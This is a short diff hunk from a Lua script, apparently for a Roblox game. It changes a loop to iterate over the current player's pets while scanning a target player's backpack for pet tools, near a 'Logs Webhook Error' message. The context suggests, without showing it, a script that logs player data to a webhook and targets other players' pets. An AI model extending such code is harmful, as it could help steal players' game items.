@@ -680,7 +680,7 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
                 local currentPets = GetPlayerPets()
                 if #currentPets == 0 then continue end
 
-                for _, pet in ipairs(PetPriorityData) do
+                for _, pet in ipairs(currentPets) do
                     for _, tool in targetPlr.Backpack:GetChildren() do
                         if tool:IsA("Tool")
                         and tool:GetAttribute("ItemType") == "Pet"
